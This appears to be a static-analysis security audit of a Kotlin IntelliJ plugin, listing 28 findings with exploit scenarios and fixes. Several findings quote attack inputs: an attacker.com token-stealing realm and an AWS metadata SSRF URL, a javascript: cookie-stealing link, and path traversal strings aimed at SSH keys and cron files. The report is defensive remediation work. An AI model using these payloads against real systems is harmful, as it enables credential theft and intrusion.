# Security & Vulnerability Audit — 2026-03-24

**Target:** Workflow Orchestrator IntelliJ Plugin (Kotlin, 10 modules)
**Scope:** Credential management, input validation, network security, file system, dependencies, privacy
**Methodology:** Static code analysis across all source files by 4 specialized agents, then deduplicated and prioritized

---

## Executive Summary

| Severity | Count | Key Themes |
|----------|-------|------------|
| **CRITICAL** | 6 | SSRF via Docker registry realm, XSS in markdown→HTML, env var leak to Maven subprocess, auth header on redirects, source code sent to Cody AI, insecure temp file permissions |
| **HIGH** | 8 | Path traversal (PR file nav + attachment download), no HTTPS enforcement, no cert pinning, HTTP cache unencrypted, CredentialStore global scope, Cody process cleanup, error message URL leaks |
| **MEDIUM** | 10 | Tokens as immutable Strings, Nexus username in plaintext XML, unfiltered Jira descriptions to Cody, no response content-type validation, log injection, clipboard exposure, notification logging, ReDoS, race condition, integer overflow |
| **LOW** | 4 | Secret key names logged, response body in error logs, unvalidated file extensions, clipboard auto-clear |

**Total: 28 unique findings** (deduplicated across 4 audit domains)

---

## CRITICAL Findings

### SEC-01: SSRF via Docker Registry Bearer Token Realm

| Field | Detail |
|-------|--------|
| **File** | `automation/src/main/kotlin/.../api/DockerRegistryClient.kt:166-192` |
| **Issue** | `parseWwwAuthenticate()` extracts the `realm` parameter from the `WWW-Authenticate` header and uses it directly as a URL in `fetchBearerToken()`. An attacker-controlled registry can set `realm=https://attacker.com/steal?token=` to redirect authentication to an arbitrary server. |
| **Exploit** | (1) User configures Docker Registry URL to attacker's server. (2) Server responds with `WWW-Authenticate: Bearer realm="http://169.254.169.254/latest/meta-data/"`. (3) Plugin makes request to AWS metadata service, leaking EC2 credentials. |
| **CVSS** | 9.1 (Critical) |
| **Fix** | Validate that `realm` URL has the same origin (scheme+host) as the configured registry URL. Reject private IP ranges (`127.0.0.1`, `169.254.x.x`, `10.x.x.x`, `192.168.x.x`). |

### SEC-02: XSS/HTML Injection in Markdown-to-HTML Conversion

| Field | Detail |
|-------|--------|
| **Files** | `pullrequest/src/.../ui/PrDetailPanel.kt:1745-1765`, `bamboo/src/.../service/MarkdownToHtml.kt:81-91` |
| **Issue** | `markdownToHtml()` escapes HTML entities first but then applies regex `\\[(.+?)\\]\\((.+?)\\)` → `<a href='$2'>$1</a>`. This allows `javascript:` protocol URLs: `[click](javascript:alert(document.cookie))` becomes executable. |
| **Exploit** | Attacker creates PR description or build comment with malicious markdown. When rendered in IDE's JTextPane, JavaScript executes in the IDE's context with access to plugin APIs. |
| **CVSS** | 8.6 (High-Critical) |
| **Fix** | Whitelist URL schemes to `http://` and `https://` only: `if (!url.startsWith("http://") && !url.startsWith("https://")) url = "#"`. |

### SEC-03: Environment Variable Leakage to Maven Subprocess

| Field | Detail |
|-------|--------|
| **File** | `core/src/.../maven/MavenBuildService.kt:32, 125` |
| **Issue** | `.withEnvironment(System.getenv())` passes ALL environment variables to the Maven subprocess, including `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, `GITHUB_TOKEN`, `GITLAB_TOKEN`, SSH keys, and any other secrets in the environment. |
| **Exploit** | Malicious Maven plugin/dependency reads `System.getenv()` and exfiltrates all tokens to attacker's server. This is a supply-chain attack vector. |
| **CVSS** | 8.2 (High-Critical) |
| **Fix** | Filter environment variables: `System.getenv().filterKeys { !it.matches(Regex(".*(?i)(TOKEN\|KEY\|SECRET\|PASSWORD\|CREDENTIAL\|AWS_).*")) }`. |

### SEC-04: Auth Header Sent on Cross-Host Redirects

| Field | Detail |
|-------|--------|
| **File** | `core/src/.../auth/AuthTestService.kt:20-25` |
| **Issue** | `testClient` enables `followRedirects(true)` and `followSslRedirects(true)`. If a configured service URL redirects to a different host, the `Authorization: Bearer <token>` header is sent to the redirect target. |
| **Exploit** | Attacker controls DNS for `jira.internal.company.com` → redirects to `attacker.com`. User clicks "Test Connection" → token sent to attacker. |
| **CVSS** | 8.1 (High) |
| **Fix** | Set `followRedirects(false)` on the test client, or add a redirect interceptor that validates target host matches original. |

### SEC-05: Full Source Code Sent to External Cody/Sourcegraph Service

| Field | Detail |
|-------|--------|
| **Files** | `cody/src/.../service/CodyContextService.kt`, `CodyChatService.kt:186`, `CodyTextGenerationService.kt` |
| **Issue** | When generating commit messages, PR descriptions, or AI fixes, the plugin sends full git diffs, complete source files, Spring endpoint configurations, class annotations, method signatures, and Jira ticket descriptions to Sourcegraph's external servers. No content filtering or user consent dialog. |
| **Exploit** | MITM attacker or compromised Sourcegraph infrastructure can intercept proprietary source code, internal API endpoints, database schemas, or credentials accidentally pasted in Jira descriptions. |
| **CVSS** | 7.5 (High) |
| **Fix** | (1) Add user consent dialog on first Cody use. (2) Implement content filter to redact patterns (API keys, AWS keys, internal URLs). (3) Add configurable `maxDiffSizeForCody` limit. (4) Show exactly what will be sent before sending. |

### SEC-06: Insecure Temp File Permissions and Race Condition

| Field | Detail |
|-------|--------|
| **Files** | `jira/src/.../service/AttachmentDownloadService.kt:176-180, 96`, `bamboo/src/.../ui/StageDetailPanel.kt:387-389` |
| **Issue** | Temp directory created with `dir.mkdirs()` (default 0755 on Unix — world-readable). `deleteOnExit()` is unreliable: files survive JVM crashes. Other local users can read downloaded Jira attachments or build logs. |
| **Exploit** | Attacker on shared machine monitors `/tmp/workflow-orchestrator-attachments/` and reads sensitive Jira attachments (contracts, PII, credentials). |
| **CVSS** | 7.2 (High) |
| **Fix** | Use `Files.createTempDirectory()` with `PosixFilePermissions.asFileAttribute(OWNER_READ, OWNER_WRITE, OWNER_EXECUTE)`. Replace `deleteOnExit()` with explicit cleanup in `finally` blocks. |

---

## HIGH Findings

### SEC-07: Path Traversal in PR File Navigation

| Field | Detail |
|-------|--------|
| **File** | `pullrequest/src/.../ui/PrDetailPanel.kt:~1850-1860` |
| **Issue** | `navigateToFile(relativePath, line)` constructs `"$basePath/$relativePath"` without validating that the result stays within the project. A malicious PR diff referencing `../../../../.ssh/id_rsa` would open the user's SSH private key in the editor. |
| **Fix** | Use `Path.normalize()` and verify `resolvedPath.startsWith(basePath)`. |

### SEC-08: Path Traversal in Attachment Download Filename

| Field | Detail |
|-------|--------|
| **File** | `jira/src/.../service/AttachmentDownloadService.kt:88` |
| **Issue** | `File(dir, attachment.filename)` uses the server-provided filename directly. A filename like `../../etc/cron.d/malicious` could write outside the temp directory. |
| **Fix** | `attachment.filename.substringAfterLast('/')` + canonical path check. |

### SEC-09: No HTTPS Enforcement for Service URLs

| Field | Detail |
|-------|--------|
| **Files** | `core/src/.../settings/GeneralConfigurable.kt:238-240`, `ConnectionSettings.kt`, `SetupDialog.kt` |
| **Issue** | URL fields accept any string without protocol validation. User can enter `http://jira.company.com` and tokens are sent in plaintext. |
| **Fix** | Validate `url.startsWith("https://")` in settings UI. Show warning for HTTP. |

### SEC-10: No TLS Certificate Pinning

| Field | Detail |
|-------|--------|
| **File** | `core/src/.../http/HttpClientFactory.kt:47-59` |
| **Issue** | OkHttp uses default system certificate store. No certificate pinning for any service. Compromised CA or MITM proxy can intercept all API traffic. |
| **Fix** | Add `CertificatePinner` for each configured service host (configurable per deployment). |

### SEC-11: HTTP Response Cache Stores Sensitive Data Unencrypted

| Field | Detail |
|-------|--------|
| **File** | `core/src/.../http/HttpClientFactory.kt:47-49` |
| **Issue** | OkHttp disk cache at `~/.IdeaIC/system/workflow-orchestrator/http-cache/` stores API responses containing Jira issues, build logs, PR diffs, and code coverage data in plaintext. Other local processes/plugins can read it. |
| **Fix** | Disable caching for sensitive endpoints. Add `Cache-Control: no-store` for auth-related requests. Consider encrypted cache or memory-only cache. |

### SEC-12: CredentialStore Global Scope Leaks Tokens Across Projects

| Field | Detail |
|-------|--------|
| **File** | `core/src/.../auth/CredentialStore.kt:24` |
| **Issue** | Static `tokenCache` in companion object is shared across ALL projects. If user opens Project A (corporate) and Project B (open source), a malicious extension in Project B can call `CredentialStore().getToken(ServiceType.JIRA)` and get the corporate Jira token from Project A. Cache never clears on project close. |
| **Fix** | Scope cache per-project or make CredentialStore a `@Service(Service.Level.PROJECT)`. Clear cache on project close. |

### SEC-13: Cody Agent Process Not Reliably Terminated

| Field | Detail |
|-------|--------|
| **File** | `cody/src/.../agent/CodyAgentManager.kt:251-263` |
| **Issue** | `dispose()` has 5-second timeout, `destroyForcibly()` doesn't kill child processes, secrets map is never cleared. Stray Cody process persists after plugin disable with cached Sourcegraph token in memory. |
| **Fix** | Kill child processes via `ProcessHandle.descendants()`. Clear secrets map in dispose. Extend timeout to 30s. |

### SEC-14: Error Messages Expose Internal URLs and Server Details

| Field | Detail |
|-------|--------|
| **Files** | `jira/src/.../api/JiraApiClient.kt:299-318`, `bamboo/src/.../api/BambooApiClient.kt:209-230` |
| **Issue** | API response bodies (first 500 chars) and full API paths logged at INFO level. IDE logs are accessible via Help > Show Log. Supports reconnaissance of internal service structure. |
| **Fix** | Log at DEBUG level only. Hash paths in INFO logs. Never log response bodies. |

---

## MEDIUM Findings

### SEC-15: Tokens Stored as Immutable Strings in Memory
**Files:** `CredentialStore.kt`, `SetupDialog.kt`, `JiraTaskRepository.kt`
Strings persist in JVM heap until GC. Heap dump exposes all tokens.
**Fix:** Use `CharArray` with `Arrays.fill(0)` after use.

### SEC-16: Nexus Username in Plaintext XML
**File:** `PluginSettings.kt:21` — `var nexusUsername by string("")` stored in `workflowOrchestrator.xml`.
**Fix:** Store in PasswordSafe alongside password.

### SEC-17: Unfiltered Jira Description Sent to Cody AI
**File:** `CodyChatService.kt:163-166` — Ticket descriptions (may contain API keys, customer PII) sent to Sourcegraph, truncated to 500 chars but not sanitized.
**Fix:** Redact URL/key/email patterns before sending.

### SEC-18: No Response Content-Type Validation
**Files:** `JiraApiClient.kt:302-303`, `SonarApiClient.kt` — JSON deserialization without checking Content-Type. Malicious proxy returning HTML could cause crashes or unexpected behavior.
**Fix:** Validate `Content-Type: application/json` before parsing.

### SEC-19: Log Injection via User Input
**Files:** Multiple API clients log user queries with newlines: `log.info("query='$query'")`. Attacker can inject fake log lines.
**Fix:** Sanitize `\n\r` in logged values.

### SEC-20: Clipboard Exposure Without Confirmation
**File:** `QaClipboardPanel.kt:45-52` — Docker tags, ticket IDs, Bamboo URLs copied to system clipboard accessible by all processes. No user confirmation.
**Fix:** Auto-clear clipboard after 30 seconds.

### SEC-21: Notification Content Logged
**File:** `WorkflowNotificationService.kt:27` — Notification titles (may contain ticket details, failure reasons) logged at INFO level.
**Fix:** Log notification type only, not content.

### SEC-22: ReDoS via User-Configurable Regex
**File:** `ConnectionSettings.kt:32` — `ticketIdPattern` is user-configurable regex applied to branch names/commit messages without validation.
**Fix:** Wrap in `try-catch` with timeout, or validate regex complexity.

### SEC-23: Cody Agent Race Condition
**File:** `CodyAgentManager.kt:46-72` — `isRunning()` called outside mutex. Between check and return, process can be killed.
**Fix:** Move all state checks inside `startMutex.withLock`.

### SEC-24: Integer Overflow in Comment ID Parsing
**File:** `PrDetailPanel.kt:2175` — `toInt()` on comment IDs that may exceed `Int.MAX_VALUE` from server.
**Fix:** Use `toLongOrNull()` with fallback.

---

## LOW Findings

### SEC-25: Secret Key Names Logged
`CodyAgentClient.kt:31` — `log.info("Agent requesting secret for key: ${params.key}")` reveals which secrets are accessed.

### SEC-26: Response Body in Error Logs
`AuthTestService.kt:87` — First 200 chars of error response logged at ERROR level.

### SEC-27: Incomplete Source File Extension Whitelist
`CopyrightFixService.kt:31-32` — Only 7 extensions whitelisted; Scala/Groovy/Clojure files silently skipped.

### SEC-28: Plaintext String Before Base64 Encoding
`CredentialStore.kt:115` — `"$username:$password"` string created in memory before Base64 encoding.

---

## Dependency Analysis

| Dependency | Version | Status |
|---|---|---|
| kotlin | 2.1.10 | OK |
| kotlinx-coroutines | 1.8.0 | OK |
| kotlinx-serialization | 1.7.3 | OK |
| okhttp | 4.12.0 | Upgrade to 4.13+ (HTTP/2 DoS fix) |
| sqlite-jdbc | 3.45.3.0 | OK |
| lsp4j-jsonrpc | 0.23.1 | OK |
| gson | 2.11.0 | OK |

---

## Positive Security Practices

- All credentials stored in IntelliJ's PasswordSafe (OS keychain-backed)
- No hardcoded credentials found in entire codebase
- Bearer/Basic auth correctly separated per service type
- Centralized auth injection via OkHttp Interceptor
- Retry interceptor doesn't expose sensitive data
- Request timeouts configured (connect + read)
- Extension points correctly marked `dynamic="true"`

---

## Priority Action Plan

### P0 — Before Release (Week 1)
1. **SEC-01**: Validate Docker registry `realm` URL origin
2. **SEC-02**: Whitelist `http://`/`https://` schemes in markdown→HTML
3. **SEC-03**: Filter sensitive env vars before Maven subprocess
4. **SEC-04**: Disable redirects in AuthTestService test client
5. **SEC-07/08**: Path traversal fixes (normalize + boundary check)

### P1 — Sprint 1
6. **SEC-05**: Add Cody AI data consent dialog + content filter
7. **SEC-06**: Secure temp file permissions
8. **SEC-09**: Enforce HTTPS-only URLs in settings
9. **SEC-12**: Scope CredentialStore per project
10. **SEC-13**: Reliable Cody process cleanup + secrets clearing

### P2 — Sprint 2
11. **SEC-10**: Certificate pinning (configurable per deployment)
12. **SEC-11**: Disable HTTP cache for sensitive endpoints
13. **SEC-14**: Move API path logging to DEBUG level
14. **SEC-15**: Migrate token handling to CharArray
15. **SEC-18**: Content-Type validation on API responses

### P3 — Backlog
16-28: Remaining MEDIUM and LOW findings
